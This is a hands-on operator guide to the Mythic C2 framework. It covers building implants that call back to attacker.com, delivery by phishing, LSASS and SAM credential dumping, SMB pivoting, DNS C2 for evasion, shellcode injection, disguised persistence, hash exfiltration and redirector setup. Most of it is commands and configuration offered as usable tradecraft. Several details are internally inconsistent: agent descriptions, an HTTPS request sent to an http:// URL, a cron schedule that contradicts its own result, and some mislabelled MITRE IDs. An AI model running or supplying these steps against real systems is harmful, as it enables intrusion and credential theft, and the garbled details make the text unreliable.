# Mythic C2 — Hands-On Use Cases

## Setting Up Initial Mythic Server and Installing an Agent

**MITRE ID:** T1583.007 (Acquire Infrastructure: Malware)

**Prerequisites:** Operator's Linux host with Docker/Docker-Compose, GitHub account for cloning agents/profiles.

**Scenario:** Operator wants to set up a Mythic instance with the Poseidon agent and HTTP C2 profile ready for deployment.

### Step 1: Initialize Mythic Server

```bash
# Clone Mythic repo
git clone https://github.com/its-a-feature/Mythic.git
cd Mythic

# Build the mythic-cli binary
sudo make

# Start all containers
sudo mythic-cli start

# Wait for startup (~30-60s for all containers to be healthy)
sudo mythic-cli status
```

### Step 2: Install Poseidon Agent

```bash
# Install the Poseidon agent from GitHub
sudo mythic-cli install github https://github.com/MythicAgents/poseidon

# Verify installation (agent will appear in the web UI under Payload Types)
sudo mythic-cli status
```

### Step 3: Install HTTP C2 Profile

```bash
# Install HTTP C2 profile
sudo mythic-cli install github https://github.com/MythicC2Profiles/http

# Verify installation (profile will appear in web UI under C2 Profiles)
sudo mythic-cli status
```

### Step 4: Access Mythic Web UI

- Navigate to `https://localhost:8443` (default).
- Login with `admin:password` (default, can be changed via `sudo mythic-cli config set MYTHIC_PASSWORD <newpass>`).
- Create a new "Operation" (like a pentest engagement session).
- Verify HTTP listener is running on the configured port (default 80 for HTTP, 443 for HTTPS).

---

## Generating and Deploying an HTTP-Based Windows Payload

**MITRE ID:** T1204.002 (User Execution: Malicious File)  
**Secondary:** T1071.001 (Application Layer Protocol: Web Protocols)

**Scenario:** Operator has phished a Windows user and needs to generate an Apollo (C#) agent for HTTP-based callback to Mythic server.

### Payload Generation (via Web UI)

1. In Mythic web UI, navigate to **Payloads** → **Create Payload**.
2. Select:
   - **Payload Type:** Apollo (C# Windows agent)
   - **Operator:** (your username)
   - **C2 Profile:** HTTP
3. Configure **HTTP C2 Parameters:**
   - **Callback Host:** `attacker.com` (or operator's Mythic server IP; can be redirector)
   - **Callback Port:** `8080`
   - **Encrypted:** Yes (default; uses AES-256-GCM)
   - **HTTPS:** No (HTTP-only, less likely to trigger cert pinning)
4. Configure **Agent Parameters (Apollo-specific):**
   - **Process Name:** `svchost.exe` (sacrificial process for injection)
   - **Sleep Interval:** `5000` (5 seconds between check-ins; shorter = more interactive)
   - **Jitter:** `30` (add 0-30% random delay to check-in intervals)
   - **User-Agent:** (Custom user-agent string to blend into network traffic; default is realistic Windows UA)
5. Click **Build**.
6. Download the generated `.exe` binary.

### Deployment

```bash
# Operator stages the Apollo.exe binary via phishing email attachment
# Target user executes the binary
# Apollo.exe starts, creates a network connection to attacker.com:8080

# Apollo's execution:
# 1. Resolves attacker.com via DNS
# 2. Creates HTTPS POST request to http://attacker.com:8080/<random-uri>
# 3. Sends initial beacon: [hostname, username, PID, parent PID, elevation status]
# 4. Receives encrypted task list from Mythic database
# 5. Executes queued commands, uploads results, sleeps for 5s + jitter
```

### Verify Callback in Mythic

- **Callbacks list** → new callback appears (hostname, username, process name).
- Click callback → **Interact** panel opens.
- Queue first command: `whoami`.
- Apollo's next check-in retrieves the task, executes `cmd.exe /c whoami`, returns result.
- Result appears in Mythic's callback task history.

---

## Enumeration: Active Directory Reconnaissance via Windows Agent

**MITRE ID:** T1018 (Remote System Discovery) / T1087.002 (Account Discovery: Domain Account)

**Scenario:** Operator has a callback on a domain-joined Windows system, needs to enumerate Domain Admin users and computers.

### Command Sequence (Mythic Web UI or CLI)

```bash
# Using Poseidon or Aspen agent (Windows, AD-aware)

# 1. Query domain users (requires domain connectivity)
# Aspen agent example:
Get-DomainUser -Properties samAccountName, description

# 2. Query for accounts with "admin" in description
Get-DomainUser | Where-Object { $_.description -like "*admin*" }

# 3. Query domain computers (filter for servers)
Get-DomainComputer -Properties dnsHostName, operatingSystem | Where-Object { $_.operatingSystem -like "*Server*" }

# 4. Identify Domain Admin group members
Get-DomainGroupMember -Identity "Domain Admins" -Properties samAccountName

# 5. Query Kerberoast targets (accounts with SPNs)
Get-DomainUser -SPN | Select-Object samAccountName, servicePrincipalName
```

### Behind the Scenes

- Each command is queued in the Mythic database as a **Task** for the target callback.
- On the next check-in (5s + jitter), the implant retrieves the task.
- The command is executed via PowerShell/.NET reflection (agent-dependent).
- Results are uploaded back to the database.
- Operator can review results in the Mythic web UI or export to CSV.

---

## Credential Harvesting: LSASS Dump and SAM Extraction

**MITRE ID:** T1003.001 (OS Credential Dumping: LSASS Memory)  
**Secondary:** T1003.002 (OS Credential Dumping: SAM)

**Scenario:** Operator needs to dump cached credentials from a compromised Windows system for offline cracking.

### LSASS Memory Dump (Apollo Agent)

```bash
# In Mythic web UI, target the callback and queue:

# Method 1: Reflective dumping (in-memory, avoids disk write)
dump_lsass

# Apollo executes:
# 1. Opens handle to lsass.exe with PROCESS_VM_READ access
# 2. Reads memory regions known to contain credential material
# 3. Returns encrypted buffer to Mythic database
# 4. Operator downloads the binary dump from Mythic UI
```

### SAM Registry Hive Extraction

```bash
# Queue registry dump command:

# Requires admin privileges (User Account Control bypass often needed)
dump_sam

# Command execution:
# 1. reg.exe save HKLM\SAM C:\Windows\Temp\sam.tmp
# 2. reg.exe save HKLM\SYSTEM C:\Windows\Temp\system.tmp
# 3. reg.exe save HKLM\SECURITY C:\Windows\Temp\security.tmp
# 4. Upload hives to Mythic database
# 5. Operator downloads hives, runs secretsdump.py (Impacket) offline
```

### Timeline Correlation

- **LSASS dump via Apollo:** appears as Sysmon 10 (CreateRemoteThread) into lsass.exe, OpenProcess access mask 0x1F3FFF (full access).
- **Registry dump via reg.exe:** appears as Sysmon 1 (Process Create) with cmd string containing `reg save HKLM\SAM`.
- Both artifacts correlated by timestamp and source process.

---

## Lateral Movement: Creating a Peer-to-Peer Agent Relay via SMB

**MITRE ID:** T1021.002 (Remote Services: SMB/Windows Admin Shares)  
**Secondary:** T1570 (Lateral Tool Transfer)

**Scenario:** Operator has a callback on a domain-joined workstation but needs to reach a high-value server on an internal-only subnet (no direct outbound Internet). Operator will use SMB pivoting to establish a second callback via the first implant.

### Setup: Agent Relay Configuration

```bash
# In Mythic, with the first callback active (Workstation A):

# 1. Generate a new Poseidon payload, but select:
#    - C2 Profile: SMB (instead of HTTP)
#    - Callback Host: <internal IP of Workstation A>
#    - This creates a payload that **doesn't contact Internet**, only calls back to Workstation A via named pipes

# 2. Download the SMB payload (e.g., Poseidon_smb.exe)

# 3. Upload the SMB payload to Workstation A via the first callback:
# Queue command on first callback:
upload local_file=Poseidon_smb.exe remote_path=C:\\Windows\\Temp\\svchost.exe
```

### Execution: Relay on Workstation A

```bash
# On Workstation A, queue a command to spawn the SMB payload:
execute cmd.exe /c C:\\Windows\\Temp\\svchost.exe

# Poseidon (SMB version) executes on Workstation A:
# 1. Connects to \\Workstation A\IPC$ named pipe (localhost, no authentication needed)
# 2. Initiates SMB session, registers as a new callback in Mythic database
# 3. Creates a named pipe (e.g., \\.\pipe\msagent_<random>) for future comms
# 4. On next HTTP check-in from Workstation A, SMB payload tunnels via the pipe

# Operator now has TWO callbacks:
# - "Workstation A" (HTTP-based, direct to Mythic)
# - "Server B" (SMB-based, relayed via Workstation A via named pipe)
```

### Pivot to Server B (High-Value Target)

```bash
# Operator can now interact with Server B's callback as if direct:
# (Workstation A transparently relays each command/response via SMB)

# Queue command on Server B callback:
ps  # List processes
# Result comes back via:
# [Mythic Server] <-- HTTP <-- [Workstation A] <-- SMB named pipe <-- [Server B]

# Execute commands on Server B (without ever having direct network access):
execute whoami
execute ipconfig
execute Get-NetLocalGroupMember Administrators  # Enumerate local admins on Server B
```

### Behind the Scenes

- Workstation A acts as a **C2 proxy**, not a SOCKS tunnel. The Mythic server still orchestrates tasks via database.
- Each callback (Workstation A, Server B) is stored in the same Mythic operation.
- The operator's interface is unified — both callbacks appear in the Callbacks list with their respective IPs/hostnames.

---

## Low-Profile DNS C2: Swapping Profiles Mid-Engagement

**MITRE ID:** T1071.004 (Application Layer Protocol: DNS)  
**Secondary:** T1573.002 (Encrypted Channel: Asymmetric Encryption)

**Scenario:** Operator realizes the target network has HTTP inspection/filtering but DNS queries are allowed. Mid-engagement, operator wants to switch the existing HTTP callback to DNS for lower profile.

### Setup: DNS Profile Installation and Listener

```bash
# On operator's Mythic server:
sudo mythic-cli install github https://github.com/MythicC2Profiles/dns

# In Mythic web UI, configure DNS listener:
# - Listen on UDP port 53 (or custom port if needed)
# - Require operator-controlled domain (e.g., c2.attacker.com)
# - Configure domain's NS records to point to Mythic server's IP
#   (Example: ns1.c2.attacker.com A <operator-ip>; c2.attacker.com NS ns1.c2.attacker.com)
```

### Payload Generation: DNS-Based

```bash
# Generate a new Poseidon payload with DNS C2 profile:
# - Payload Type: Poseidon
# - C2 Profile: DNS
# - Callback Host: c2.attacker.com (not an IP, a domain name)
# - DNS Canary Detection: Yes (instructs implant to periodically query a benign domain to detect sandboxes)

# Download the DNS payload
```

### Deployment: Replace HTTP Callback

```bash
# Current situation: Poseidon (HTTP) callback active on target

# Operator uploads the DNS payload to the target via the HTTP callback:
upload local_file=Poseidon_dns.exe remote_path=C:\\Windows\\Temp\\dns_svc.exe

# Spawn the new DNS callback:
execute cmd.exe /c C:\\Windows\\Temp\\dns_svc.exe

# DNS callback initiates:
# 1. Sends DNS query: <base64-encoded-beacon>.c2.attacker.com (A record query)
# 2. Mythic's DNS listener (running on the operator's server) intercepts
# 3. Response contains encrypted task list (encoded in TXT record or IP address itself)
# 4. Poseidon decrypts, executes tasks, reports results via next DNS query

# Now operator has:
# - "HTTP callback" (original, still active, can be killed)
# - "DNS callback" (new, lower-profile, less likely to trigger IDS)
```

### Evasion Benefits

- **DNS less inspected** — most network filters allow DNS egress by default (users need DNS to browse).
- **No certificate pinning** — DNS has no TLS handshake, avoids Cobalt Strike/Sliver-style cert pinning detection.
- **Lower volume** — DNS queries are smaller than HTTP POST/GET patterns, easier to hide in background traffic.

---

## Process Injection and Defense Evasion: In-Memory Shellcode Execution

**MITRE ID:** T1055 (Process Injection)  
**Secondary:** T1027 (Obfuscated Files or Information)

**Scenario:** Operator wants to inject shellcode into a sacrificial process (e.g., `notepad.exe`) to avoid spawning `cmd.exe` child processes that would trigger detection.

### Command Execution via Process Injection (Apollo Agent)

```bash
# In Mythic, queue command on Apollo callback:

# Method: reflective DLL injection into a target process

inject process_name=notepad.exe shellcode=<base64-shellcode-blob>

# Apollo execution:
# 1. Spawns a new notepad.exe process (suspended via CREATE_SUSPENDED flag)
# 2. Allocates memory in the process with VirtualAllocEx (RWX, PAGE_EXECUTE_READWRITE)
# 3. Writes shellcode into allocated memory (WriteProcessMemory)
# 4. Resumes process with ResumeThread, shellcode executes
# 5. Shellcode connects back to Mythic server via HTTP (from within notepad context, not cmd.exe)

# Process tree result:
# notepad.exe (no cmd.exe child!)
#   └── Network connection: notepad.exe -> attacker.com:80
```

### Evasion Benefit

- **No cmd.exe spawn** — many EDR/SIEM rules trigger on `cmd.exe` as a child of user processes. Injection avoids this.
- **Process spoofing** — notepad.exe making network connections is unusual but less obvious than cmd.exe → Internet.
- **Memory-only execution** — shellcode runs in memory; no disk artifact (temporary `.exe` file on system).

---

## Persistence: Scheduled Task via Cron (Linux) or Task Scheduler (Windows)

**MITRE ID:** T1053.005 (Scheduled Task/Job: Scheduled Task)

**Scenario:** Operator has a Poseidon callback on a Windows server and wants to maintain persistence across reboots.

### Scheduled Task Persistence (Windows)

```bash
# Queue persistence command on Poseidon Windows callback:

persist_scheduled_task task_name=WindowsUpdate \
  trigger=ONSTART \
  action="C:\\Windows\\Temp\\beacon.exe" \
  hidden=true

# Poseidon execution:
# 1. Uses schtasks.exe: schtasks /create /tn "WindowsUpdate" /tr "C:\\Windows\\Temp\\beacon.exe" /sc ONSTART
#    (This avoids spawning cmd.exe directly; schtasks API is called directly via .NET)
# 2. Task created in: HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tree\\WindowsUpdate
# 3. Every system reboot, the scheduled task triggers beacon.exe
# 4. Beacon re-registers as a callback in Mythic, operator maintains access
```

### Linux Persistence via Cron

```bash
# Queue persistence on a Linux callback (Poseidon, Artemis, or Rogue):

persist_cron schedule="0 * * * *" command="/opt/beacon.sh"

# Result: Crontab entry created
# */5 * * * * /opt/beacon.sh  (runs beacon every 5 minutes)
# Entry stored in user's crontab or root's if privilege escalation was successful
```

---

## Multi-Agent Coordination: Aggregate Enumeration Across Callbacks

**MITRE ID:** T1087.004 (Account Discovery: Domain Trust Discovery)

**Scenario:** Operator has callbacks on multiple Windows systems in the domain and wants to aggregate enumeration results (e.g., local admins on each host) in a single report.

### Batch Command Queuing

```bash
# In Mythic web UI, navigate to Callbacks list

# Select multiple callbacks (Ctrl+click):
- Workstation A
- Workstation B
- Server C
- Server D

# Queue command to all selected callbacks simultaneously:
# Command: Get-LocalGroupMember -Group Administrators | Select-Object -Property Name

# Mythic creates 4 separate Tasks (one per callback)
# Each callback executes on its next check-in (~5s intervals)
# Results appear in the callback task history

# Operator can export all results to CSV:
# Callback A: DOMAIN\AdminUser1
# Callback B: DOMAIN\AdminUser2, LocalAdmin
# Callback C: DOMAIN\DomainAdmins
# Callback D: NT AUTHORITY\SYSTEM (local only)

# Aggregate report: identify which users are admins on multiple systems
```

### Multi-Callback Workflow

- **Centralized task database** — Mythic stores every queued command and result per callback.
- **Async execution** — no need to wait for one callback to finish before executing on the next; all tasks queued simultaneously.
- **Unified operator interface** — operator doesn't manage multiple reverse shells; all interactions go through Mythic's web UI/CLI.

---

## Custom Command Development: Extending an Agent

**MITRE ID:** T1648 (Serverless Execution)

**Scenario:** Operator needs a custom command (e.g., enumerate all network shares on a Windows host) not present in Poseidon's built-in module list.

### Step 1: Clone Agent Source

```bash
# Clone Poseidon agent repository
git clone https://github.com/MythicAgents/poseidon.git
cd poseidon
```

### Step 2: Create New Command Module

```python
# File: poseidon/agent_code/poseidon/commands/enumerate_shares.py

from mythic_container.MythicCommandBase import *

class enumerate_shares(MythicCommandBase):
    arg_name = "enumerate_shares"
    description = "Enumerate all network shares on the local system"
    
    async def create_go_task(self, taskData: PTTaskMessageAllData) -> PTTaskCreateTaskingResponse:
        response = PTTaskCreateTaskingResponse(
            TaskID=taskData.Task.ID,
            Success=True
        )
        
        # Task is generated and will be sent to target via Mythic database
        return response
    
    async def process_response(self, response: str, taskData: PTTaskMessageAllData) -> PTTaskProcessResponseResponse:
        # Process the response from the agent
        return PTTaskProcessResponseResponse(
            TaskID=taskData.Task.ID,
            Success=True,
            UserOutput=response
        )
```

### Step 3: Rebuild Agent

```bash
# In the Poseidon repository, trigger agent rebuild:
# The Mythic container system will:
# 1. Read the new command module
# 2. Recompile the agent binary with the new command
# 3. Register the command in the Mythic database

sudo mythic-cli uninstall poseidon
sudo mythic-cli install github https://github.com/MythicAgents/poseidon
```

### Step 4: Deploy and Use

```bash
# Generate a new Poseidon payload (now includes enumerate_shares command)
# Download, deploy to target

# Queue the new command on the callback:
enumerate_shares

# Agent executes:
# 1. Runs PowerShell: Get-SmbShare
# 2. Returns list of network shares
# 3. Results appear in Mythic callback history
```

---

## File Exfiltration: Download Results and Metadata

**MITRE ID:** T1041 (Exfiltration Over C2 Channel)

**Scenario:** Operator has dumped LSASS memory and SAM hives and needs to download them from Mythic server to local workstation for offline analysis.

### File Management in Mythic

```bash
# In Mythic web UI, navigate to Payloads → Files

# All files uploaded by agents appear here:
# - LSASS.dmp (uploaded by dump_lsass command)
# - sam.tmp, system.tmp, security.tmp (uploaded by dump_sam)

# Operator clicks on file → Download

# File is retrieved from PostgreSQL database and written to operator's local disk
# Operator can now run:
# secretsdump.py -sam sam.tmp -system system.tmp LOCAL
# # Parses SAM hives, outputs NTLM hashes

# LSASS dump is similarly downloaded and can be analyzed with:
# pypykatz lsa minidump LSASS.dmp
```

### File Tracking

- **Source:** callback ID, command that generated the file, timestamp.
- **Storage:** PostgreSQL database (not on disk by default, reducing infrastructure footprint).
- **Encryption:** files are encrypted with AES-256-GCM during upload to Mythic.
- **Metadata:** file name, size, hash, upload time, source callback all tracked.

---

## Payload Delivery: Redirector Setup and Staging

**MITRE ID:** T1071.001 (Application Layer Protocol: Web Protocols)

**Scenario:** Operator wants to use an external redirector (to hide Mythic server's IP) for initial payload delivery.

### Setup: HTTP Redirector (mod_rewrite on Apache)

```bash
# On a public server (redirector):

# Create Apache reverse proxy for Mythic:
# File: /etc/apache2/mods-enabled/mod_rewrite.conf

RewriteEngine On
RewriteCond %{REQUEST_URI} ^/update/config
RewriteRule ^/(.*)$ http://mythic-server-ip:8080/$1 [P,L]

# All incoming requests to /update/* are proxied to Mythic server
# Callback implant connects to: http://redirector.com:80/update/config
# Redirector forwards to: http://mythic-server-ip:8080/config
```

### Payload Configuration: Redirector vs. Direct

```bash
# When generating Apollo payload in Mythic:

# Option 1: Direct (high risk of server IP exposure)
# Callback Host: mythic-server-ip

# Option 2: Redirector (recommended for operational security)
# Callback Host: redirector.com
# Callback Port: 80
# Mythic server still listening on 8080 internally
# Operator's firewall allows Apache redirector inbound, blocks 8080 access
```

### Traffic Flow

```
[Target] -- HTTP POST /update/config --> [Redirector:80 (public)]
                                             |
                                             | Reverse proxy
                                             v
                                    [Mythic:8080 (internal)]
```

This architecture hides the real Mythic server's IP from the target and defenders.
